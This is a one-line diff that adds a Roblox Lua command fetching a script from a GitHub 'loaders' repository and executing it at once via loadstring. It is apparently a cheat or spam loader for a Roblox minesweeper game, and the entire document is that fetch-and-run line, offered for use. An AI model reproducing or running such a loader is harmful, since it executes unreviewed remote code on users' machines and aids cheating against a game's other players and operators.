@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/blockerman-s-minesweeper-spam7-dytpel6so3waeu.lua"))()
